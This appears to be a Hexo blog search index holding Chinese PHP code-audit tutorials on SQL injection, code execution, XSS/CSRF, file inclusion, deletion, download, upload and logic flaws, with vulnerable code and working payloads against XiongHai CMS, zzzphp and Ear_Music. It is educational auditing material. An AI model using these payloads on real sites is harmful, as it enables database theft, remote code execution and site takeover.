<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初始代码审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>终于来到了代码审计篇章。希望看了朋友有所收获，我们通常把代码审计分为黑盒和白盒，我们一般结合起来用。</p><p>通常我们白盒审计有多种方法我们可以归纳为：</p><p>1.通读全文</p><p>2.回溯</p><p>其中通读全文费时间，但是有利于代码审计的经验积累，也能更深入的挖掘一些难以发现的漏洞。功能回溯我们可以定向的审计一些功能和函数，最常见的就是对命令执行函数的回溯，和上传等功能的审计。通过熟悉白盒审计有利于漏洞的发掘，因为代码审计和开发都能熟悉到程序中那些地方会存在对数据库的操作和功能函数的调用，举个简单的例子当我们看到download的时候，我们就会想到是不是有任意文件下载。</p><h1 id="0x01-环境与工具"><a href="#0x01-环境与工具" class="headerlink" title="0x01 环境与工具"></a>0x01 环境与工具</h1><p>我们在代码审计中又可以分为静态和动态，静态我们通常用于无法搭建原来的环境只能看代码逻辑来判断是否存在漏洞，而动态调试就可以debug、输出、监控SQL语句来看非常方便。</p><p>接下来代码审计工具基本就用到Sublime Text 3、VSCode、Seay源代码审计系统、PHPStorm+XDebug、文件对比、MYSQL监控、编码转换、正则调试等。其中文件对比工具可以拿来和更新补丁后的文件进行对于对比定位漏洞代码区，PHPStorm+XDebug可以动态调试定位漏洞成因,也有利于漏洞的发掘。当然你也可以用那些自动化审计的，貌似还支持代码回溯，还是能审计到一些漏洞的。环境能用基本就用phpstudy了。</p><h1 id="0x02-知识准备"><a href="#0x02-知识准备" class="headerlink" title="0x02 知识准备"></a>0x02 知识准备</h1><p>代码审计我们需要对php有一定的了解，当然是越深入越好，我们也不纠结，代码审计需不需要精通php什么的，只能说知识面在什么层次就能审计到什么层次的漏洞，但是至少你得看得懂代码。</p><p>我们应该具备一些知识：</p><p>1.基本的正则</p><p>2.数据库的一些语法(这个我在前面的数据库维基已经讲的差不多了)</p><p>3.至少你得看懂php代码</p><p>4.php配置文件以及常见函数</p><h1 id="0x03-关于文章的一些问题"><a href="#0x03-关于文章的一些问题" class="headerlink" title="0x03 关于文章的一些问题"></a>0x03 关于文章的一些问题</h1><p>前面我们的实验环境我基本上不会使用框架类的，我尽量使用一些很普通的网站，还有如何用phpstudy之类的来本地搭建网站这些我也不会讲，这些基础的问题搜索一下就有，不能独立解决问题怎么能进步，遇到一些特殊的问题我还是会说一下的。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>当然如果你跟我一样是一个新手才入门代码审计，看这篇文章最好不过了，因为我会讲的很细,当然我可能很多东西也讲不到，还请大家多看看别人的审计思路，只有不断的学习才有提高。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>为什么第一章我们学习，因为看这篇文章的朋友大概也看过我前面写的MySQL_wiki系列，这里来SQL注入的话我们能方便理解，同时sql注入也是审计中我们经常想要找到的，比较以来就getshell什么的也不现实这种漏洞也不多。</p><h1 id="0x01-字符型注入"><a href="#0x01-字符型注入" class="headerlink" title="0x01 字符型注入"></a>0x01 字符型注入</h1><p>这里我们看到sqli-libs第一关的代码</p><pre><code>&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;</code></pre><p>我们可以看到调用<code>$_GET[&#39;id&#39;]</code>获取参数内容，没有经过任何过来带入了SQL语句的查询，也就是代码没有任何过来且没开魔术引号，那么将会形成注入，如果开启魔术引号遇到数字型的我们还是能够注入的，因为<code>magic_quotes_gpc</code>只会转义单引号、双引号、反斜线、NULL，但是数字型注入我们可以不试用到这些。</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-1%27union%20select%201,user(),3--%20+</code></pre><h1 id="0x02-编码类注入"><a href="#0x02-编码类注入" class="headerlink" title="0x02 编码类注入"></a>0x02 编码类注入</h1><p>有些为了业务需要他会把传入一些编码后的参数再解码带入数据库查询，我们常见的有base64编码，也有的程序会内置url解码，这类写法通常见于框架。</p><p>1.base64</p><pre><code>&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=base64_decode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>传入的值base64解密后带入查询，这种注入魔术引号是没办法拦截的，当我们遇到网站为base64编码的参数时可以留意下。</p><pre><code>http://127.0.0.1/sqli/Less-1/base64.php?id=JyB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyAtLSAr</code></pre><p>2.urldecode</p><pre><code>&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=urldecode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>因为接受的参数只会被url解码一次，传入的值不是魔术引号认识的值所以可以绕过</p><pre><code>http://127.0.0.1/sqli/Less-1/base64.php?id=%2527union%20select%201,user(),3--%20+</code></pre><h1 id="0x03-宽字节注入"><a href="#0x03-宽字节注入" class="headerlink" title="0x03 宽字节注入"></a>0x03 宽字节注入</h1><pre><code>&lt;?php$conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);mysql_select_db(&quot;security&quot;,$conn);mysql_query(&quot;set names &#39;gbk&#39; &quot;,$conn);$id=urldecode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>网上有很多解释大家可以搜索一下我这里就不详细介绍了大概原因就是:</p><p>id=1’-&gt;id=1&#39;-&gt;id=1%5c%27</p><p>id=1%df’-&gt;id=1%df%5c%27-&gt;id=1%DF5C%27-&gt;id=1運’</p><p>当然还有其他各种类型的注入这里就不一一列举了，看了mysql系列文章的大概都知道，不知道的可以看看。</p><h1 id="0x04-过滤"><a href="#0x04-过滤" class="headerlink" title="0x04 过滤"></a>0x04 过滤</h1><p>通常情况下一个成熟的cms是不存在不过滤的情况，一般的程序选择用函数来过滤比如<code>addslashes()</code>，也可以开启魔术引号，但是更多的程序它采用正则匹配来过滤，<br>使用不正确的匹配替换方式反而导致被绕过的机会更大，比如有的程序把<code>union</code> 替换为空，那么我们就可以双写<code>ununionion</code>绕过从而还可能绕过外部WAF,对于整数型一般采用<code>intval()</code>等字符转换，后期通过实战一步一步讲解。</p><h1 id="0x05-实战审计"><a href="#0x05-实战审计" class="headerlink" title="0x05 实战审计"></a>0x05 实战审计</h1><p>找了半天源码，还是用这款熊海CMS V1.0吧，这款CMS感觉不错，什么洞都有，非常适合我们学习审计，同时审计这个cms的文章很多，大家如果觉得我写的不如人意，还能看看别人。</p><p>首先我们审计对传入的参数如果想快速的看是否有全局过滤，不妨找个文件输出一下<code>$_POST</code>、<code>$_GET</code>等等。</p><pre><code>echo $_POST[&#39;b&#39;];echo $_GET[&#39;a&#39;];</code></pre><p><img src="./img/1.2.1.png" alt="file"></p><p>没有全局过滤 我们来到后台登陆文件admin/files/login.php 看看login.php一般登陆存在注入的可能性还是很大的</p><p><img src="./img/1.2.2.png" alt="file"></p><p>很明显 带入查询的user没有经过任何过滤，同时输出了错误，所以可以用报错查询，当然你也选择万能密码。</p><p>payload:</p><pre><code>user=1111&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=111&amp;login=yes</code></pre><p><img src="./img/1.2.3.png" alt="file"></p><p>在看看留言板 files/submit.php </p><p><img src="./img/1.2.4.png" alt="file"></p><p>传入参数没有过滤</p><p><img src="./img/1.2.5.png" alt="file"></p><p>同时插入的时候，这里使用了<code>mysql_error()</code>所以可以用报错注入，否则只能使用盲注了。</p><p><img src="./img/1.2.6.png" alt="file"></p><p>payload:</p><pre><code>cid=0&amp;name=&#39;or updatexml(1,concat(0x7e,(version())),0) or&#39;&amp;mail=1111&amp;url=http%3A%2F%2F1&amp;content=%E9%98%BF%E5%BE%B7&amp;save=%E6%8F%90%E4%BA%A4&amp;randcode=&amp;jz=1&amp;tz=1</code></pre><p>开始我们说过不是使用了过滤函数就万事大吉了，数字型注入可以不使用引号</p><p><img src="./img/1.2.7.png" alt="file"></p><p>我们看到传入的<code>cid</code>已经被<code>addslashes()</code>函数转义了，查询的地方都没啥问题，但是到浏览计数的时候调用了它，那么我们就可以使用盲注或者报错注入了，因为有错误回显。</p><p>payload：</p><pre><code>http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))</code></pre><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码执行审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>代码执行也是我们经常遇到的，通常是<code>eval()</code>、<code>assert()</code>，当然还有回调函数比如<code>call_user_func()</code> <code>array_map()</code>，正则函数，动态调用等等，因为程序对传入的参数过滤不严或者没有过滤，导致代码执行，看过我前面写的php的webshell总结的话，你就会发现很多知识是相辅相成的。</p><h1 id="0x01-代码执行"><a href="#0x01-代码执行" class="headerlink" title="0x01 代码执行"></a>0x01 代码执行</h1><p>这里说说eval的命令执行，assert在php7后面移除了。我们来看一个简单的eval代码执行</p><p>test.php</p><pre><code>&lt;?$id = $_GET[&#39;x&#39;];eval($id);?&gt;</code></pre><p>payload:</p><pre><code>test.php?x=phpinfo();</code></pre><p>简单到waf以为他是个webshell了，当然我们实际情况肯定遇不到这么简单的，可能需要多重组合利用，这里下面我以一个实例为例</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>这里使用的是zzzphp V1.6.0的一个解析标签过程中引发的代码执行，网上也有其他人的审计思路，这里我是帮朋友复现的时候弄的。</p><p>找个的审计思路是全局搜索eval，当然你也可以搜索其他的能够引发代码执行的函数，但是这个这-1里没有。</p><p>路径：\inc\zzz_template.php</p><p><img src="./img/1.3.1.png" alt="file"></p><p>我们发现eval里面有变量，那么他是可能存在代码执行的</p><p><img src="./img/1.3.2.png" alt="file"></p><p>大概看了下<code>parserIfLabel()</code> 函数没有什么过滤，能够达到我们传入任意参数的目的，到了这里我们就是回溯那里调用了这个函数呗，全局搜索下<code>parserIfLabel()</code>，没搜索到，看了下是个类，所以搜索类名<code>ParserTemplate</code>。</p><p><img src="./img/1.3.3.png" alt="file"></p><p>既然 \admin\save.php 调用了我们这个，不妨看看后台那里有模板操作这个</p><p><img src="./img/1.3.4.png" alt="file"></p><p>当然完全你也可以回溯代码去分析，但是既然有源码能看就看。</p><p><img src="./img/1.3.4.png" alt="file"></p><p>随便找个文件放入我们遵循他正则的代码即可，不过一般我们测试的过程中，尽量选择对目标影响小的文件。</p><p>payload：</p><pre><code>{if:assert(phpinfo())}x{end if}</code></pre><p>于此同类的还有苹果cms8.x，都是在解析标签过程中出现的问题，一般看到可以自定义解析标签那么就值得注意，命令执行与此类似，这里就不说了。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。</p><h1 id="0x01-XSS实战审计"><a href="#0x01-XSS实战审计" class="headerlink" title="0x01 XSS实战审计"></a>0x01 XSS实战审计</h1><p>这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。</p><p><img src="./img/1.4.1.png" alt="file"></p><p>随意留言抓包看看他请求的url再去找相对的文件<code>/?r=submit&amp;type=message</code> 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。</p><p>我们来到 files/submit.php</p><p><img src="./img/1.4.2.png" alt="file"></p><p>前面的输入基本都没过过滤，到了最后一步<code>$content</code>被 <code>addslashes(strip_tags($content));</code>过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。</p><p><img src="./img/1.4.3.png" alt="file"></p><p>一般过滤xss的函数还有<code>htmlspecialchars</code>，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。</p><h1 id="0x02-Csrf"><a href="#0x02-Csrf" class="headerlink" title="0x02 Csrf"></a>0x02 Csrf</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 <a href="http://www.404.com/1.php?id=1" target="_blank" rel="noopener">http://www.404.com/1.php?id=1</a> 访问即可删除账号，然后你在论坛发帖构造<br><code>&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt;</code> 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。</p><p>我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。</p><p><img src="./img/1.4.4.png" alt="file"></p><p>如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。</p><p><img src="./img/1.4.5.png" alt="file"></p><p>这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。</p><pre><code>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </code></pre><h1 id="0x03-组合利用"><a href="#0x03-组合利用" class="headerlink" title="0x03 组合利用"></a>0x03 组合利用</h1><p>这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)<br>本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。</p><p>1.构造CSRF表单自动提交<br>payload：</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;         //burp生成的表单      &lt;script&gt; document.forms[0].submit(); &lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;</code></pre><p>2.插入iframe标签</p><p>payload：</p><pre><code>&lt;iframe src=&quot;http://404.com/zzzp6p/1.html&quot; /&gt;</code></pre><p>还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。</p><p><img src="./img/1.4.6.png" alt="file"></p><p>用登陆了后台后访问页面，可以看到显示修改成功。</p><p>由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接</p><p>payload 1.js：</p><pre><code>function del() {    var xhr = new XMLHttpRequest();    xhr.open(&#39;GET&#39;,&#39;/xiong/admin/?r=linklist&amp;delete=6&#39;);    xhr.send(null);    }del();</code></pre><p>payload：</p><pre><code>&lt;script src=&quot;http://404.com/xiong/1.js&quot;&gt;&lt;/script&gt; </code></pre><p>查看留言板可以看到我们的XMLHTTPRequest已经发包了</p><p><img src="./img/1.4.7.png" alt="file"></p><p>比较典型的例子可以看看 <a href="https://xz.aliyun.com/t/3177" target="_blank" rel="noopener">https://xz.aliyun.com/t/3177</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件操作审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章来自 公众号：404安全</p><h1 id="0x00-文件包含"><a href="#0x00-文件包含" class="headerlink" title="0x00 文件包含"></a>0x00 文件包含</h1><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>本地文件包含（Local File Include）简称 LFI，文件包含在php中，一般涉及到的危险函数有<code>include()</code>、<code>include_once()</code>、<code>require()</code>、<code>require_once()</code>，在包含文件名中存在可控变量的话就可能存在包含漏洞，由于这几个函数的特性也可能产生其他漏洞，后面一一讲到。</p><p>示例：</p><pre><code>&lt;?php    $file = $_GET[&#39;name&#39;];    include($file);?&gt;</code></pre><p>payload:</p><pre><code>http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini</code></pre><p>这是个最简单的文件包含，没有任何过滤。但是一般程序不会这么写，一般会指定后缀，这样我们就需要截断来绕过了。</p><pre><code>&lt;?php    $file = $_GET[&#39;name&#39;];    include($file . &quot;html&quot;);?&gt;</code></pre><p>在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。</p><p>payload：</p><pre><code>http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%00</code></pre><p><img src="./img/1.5.1.png" alt="file"></p><p>利用字符.或者/.或者./来截断。系统文件路径长度限制：windows 259个byteslinux 4096个bytes。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>远程文件包含漏洞(Remote File Inclusion)简称RFI，他需要我们的php.ini中配置<code>allow_url_include</code>、 <code>allow_url_fopen</code>。</p><p>1.包含远程文件 </p><p>需要打开<code>allow_url_include=On</code>、 <code>allow_url_fopen = On</code></p><p><img src="./img/1.5.2.png" alt="file"></p><p>他可以利用?号截断，不受版本限制</p><p>payload：</p><pre><code>http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt?</code></pre><p>2.伪协议</p><pre><code>file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><p>各种伪协议的使用方法网上很多，大家搜索一下吧。</p><h3 id="实战审计"><a href="#实战审计" class="headerlink" title="实战审计"></a>实战审计</h3><p>直接看主页index.php</p><pre><code>&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#39;r&#39;]); //接收文件名$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于indexinclude(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件?&gt;</code></pre><p>他会包含files目录下的文件，因为他没有过滤../所以可以包含任意目录下的文件，由于加了后缀所以漏洞存在于低版本php。</p><p><img src="./img/1.5.3.png" alt="file"></p><h1 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h1><p>任意文件删除审计一般来说我们都是搜索函数<code>unlink</code> 然后回溯去看。</p><p>inc\zzz_file.php</p><p><img src="./img/1.5.4.png" alt="file"></p><p>首先判断传入的参数是否为空，然后拼接路径，第516行中出现了一个函数<code>ifstrin</code>,我们跟进看看</p><p><img src="./img/1.5.5.png" alt="file"></p><p>只是个简单的判断没啥特殊情况，我们再来看看拿来调用了这个文件。</p><p><img src="./img/1.5.6.png" alt="file"></p><pre><code>function file_path( $path ) {    $list=array();    $path= substr( $path, 0, strrpos( $path, &#39;/&#39; ));    $list=splits($path,&#39;/&#39;);    return $list;}function arr_search($arr1, $arr2 ) {    $result=false;    foreach ( $arr1 as $v ) {       if(in_array( $v,$arr2 )) return true;            }    return $result;}</code></pre><p>获取参数，然后看看我们传入的路径是否存在这个数组里面的值，也就是基本上是没有过滤的，因为我们完全可以通过../ 跳回去。</p><p>payload：</p><pre><code>POST /zzzp6p/admin/save.php?act=delfilepath=/zzzp6p/upload/../install/1install.lock</code></pre><p>这里我们走的下面的分支不能删除 <code>array( &#39;php&#39;, &#39;db&#39;, &#39;mdb&#39;, &#39;tpl&#39; )</code> 这个数组的文件。</p><p>要删除任意文件只需要使用</p><pre><code>path=/zzzp6p/runtime/../install/1.db</code></pre><p>让<code>ifstrin()</code>为true走上面的分支即可。</p><p>一般来说我们任意文件删除 是配合删除install.lock来达到网站重装漏洞。</p><h1 id="0x02-任意文件下载"><a href="#0x02-任意文件下载" class="headerlink" title="0x02 任意文件下载"></a>0x02 任意文件下载</h1><p>任意文件下载常见于文件的显示和下载的地方，一般关注的文件是和下载有关的，比如download。当然你还可以搭建源码，来寻找能够下载的地方。</p><p>常见的下载或读取函数: <code>file_get_contents()</code>、<code>readfile()</code> 、<code>fopen()</code></p><p>在网上找到个别人审计的实例，结合起来审计一下，用到的源码是Ear_Music_20180820_UTF8</p><p>搜索down相关的词语，找到文件\template\default\source\down.php</p><p><img src="./img/1.5.7.png" alt="file"></p><p>我们看看<code>$file</code>参数怎么来的,先是调用函数<code>getfield()</code>,转到函数去看看</p><p><img src="./img/1.5.8.png" alt="file"></p><p>不出意外应该是从数据库中读取路径，再来看看<code>geturl()</code>函数</p><p><img src="./img/1.5.9.png" alt="file"></p><p>构造下载地址，这些地方没什么问题，我们来看看什么地方对储存地址的表中插入了数据，搜索表名<code>lyric</code>。</p><p>\source\user\music\ajax.php</p><p><img src="./img/1.5.10.png" alt="file"></p><p>我们看到<code>$lyric</code>经过 <code>checkrename</code>、 <code>SafeRequest</code>这两个函数的清洗，先来转到函数<code>SafeRequest</code>。</p><p><img src="./img/1.5.11.png" alt="file"></p><p>我们传入的mode是get，然后经过<code>addslashes()</code>的转义，下面在替换为空，也就是我们基本上是不能使用<code>\\</code>了，我们在看看<code>checkrename</code></p><p><img src="./img/1.5.12.png" alt="file"></p><p>这里正则匹配了我们的</p><pre><code>.\ ?iframe=.php?</code></pre><p>这里完全看不懂他匹配后缀为php?这个的意义何在，直接php就绕过了。</p><p>所以综合起来就是不要带有<code>\ 和 ./</code> 这里我们只要传入绝对路径就可以了</p><p>登陆前台找到上传歌曲的页面在歌词地址中插入payload</p><p>payload：</p><pre><code>D:/phpstudy/PHPTutorial/WWW/Ear_Music/template/default/source/down.php</code></pre><p><img src="./img/1.5.13.png" alt="file"></p><h1 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h1><p>文件上传只有一个函数 <code>move_uploaded_file()</code> 一般来说，我们就可以搜索这个函数来回溯，看他的验证方式，是黑名单还是白名单，是否是前端限制，是否只是简单的验证了文件头，是否是能绕过的正则匹配，是否渲染了图片。</p><p>结合zzzphp来审计一下文件上传，全局搜索<code>move_uploaded_file</code></p><p>\zzzcms\inc\zzz_file.php</p><p><img src="./img/1.5.14.png" alt="file"></p><p>回溯看看那里调用了这个函数</p><p><img src="./img/1.5.15.png" alt="file"></p><p>典型的黑名单验证，可以使用asa绕过，只需要在后台添加这个扩展名</p><p><img src="./img/1.5.16.png" alt="file"></p><p>上传即可，当然也可以通过上图中的 switch分支，只要传入的 type不是他的类型就可以跳过后台添加这个步骤，</p><p><img src="./img/1.5.17.png" alt="file"></p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>对文件的操作还见于写入其他配置文件，典型的有thinkphp缓存文件写入。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞审计</title>
      <link href="/2020/040126401.html"/>
      <url>/2020/040126401.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>逻辑漏洞是指由于程序逻辑不严，或者函数使用不当，导致发生越权访问，cookies绕过，越权密码修改，重复安装等等问题。一般逻辑漏洞的挖掘需要对代码有一定阅读能力。</p><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><p>越权一般是对cookies的验证不严或者没有验证，一般我们审计后台发现某个功能没有包含验证文件，那么很有可能发生越权操作，当然越权有很多不仅仅局限于一个后台访问的问题。在众多大型网站越权问题也时常发生的，这也是漏洞挖掘中大家都比较喜欢的，有些越权在黑盒测试中或许更加容易发现，所以代码审计大家灵活运用，不要局限了你的思路。越权是个大的专题，我应该是讲不了多少还是请大家多看看文章。</p><p>1.<strong>后台越权</strong>：后台某些页面没有引入验证文件</p><p><img src="./img/1.6.1.png" alt="file"></p><p>比如这里熊海cms如果我们删除这个验证，那么就可以直接访问这个页面，有很多程序员他会忘记每个页面都添加。</p><p>2.<strong>水平越权</strong>：一个用户尝试访问与他拥有相同权限的用户的资源，比如删除收获地址处没有验证权限,导致越权删除其他人的地址。</p><p>我们用zzzcms这个程序来做演示 zzzcms\form\index.php</p><p><img src="./img/1.6.2.png" alt="file"></p><p>他这里是edituser是没有越权的，我这里只是讲解一下，简单的介绍一下越权如何去审计。我们看这个代码他最后update的时候是修改我们的uid现对的值，而我们的uid是POST包获取的，也就是如果我们可控uid那么就能越权修改其他人的资料。<br>但是这里有一条验证<code>$uid != get_session( &#39;uid&#39; )and back( &#39;很抱歉，资料修改失败&#39; );</code> 所以没办法越权，为了演示我们可以删除了来看看。</p><p><img src="./img/1.6.3.png" alt="file"></p><p>成功把UID为1的用户的资料修改了。</p><p>3.<strong>垂直越权</strong>：一个低级用户尝试访问高级别用户的功能。</p><h1 id="0x02-cookies验证不严"><a href="#0x02-cookies验证不严" class="headerlink" title="0x02 cookies验证不严"></a>0x02 cookies验证不严</h1><p>这里用到熊海CMS，我们随便点击一个后台页面，前面包含了一个验证文件<code>require &#39;../inc/checklogin.php&#39;;</code> 来看看这个文件</p><p><img src="./img/1.6.4.png" alt="file"></p><p>判断我们的cookies里面user是否为空，不为空就可以访问后台了。</p><p><img src="./img/1.6.5.png" alt="file"></p><h1 id="0x03-安装程序逻辑问题"><a href="#0x03-安装程序逻辑问题" class="headerlink" title="0x03 安装程序逻辑问题"></a>0x03 安装程序逻辑问题</h1><p>这里找了半天源码发现红日安全写过一个Simple-Log1.6这里就用他这个源码了。</p><p><img src="./img/1.6.6.png" alt="file"></p><p>这里他判断是否安装了,然后就直接跳转到主页，而程序没有退出，那么后面的依然可以执行，也就是说直接post后面的程序即可安装。</p><p><img src="./img/1.6.7.png" alt="file"></p><p>这类没有正确退出的造成的漏洞还是蛮多的，在后台等地方可以好好关注一下。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 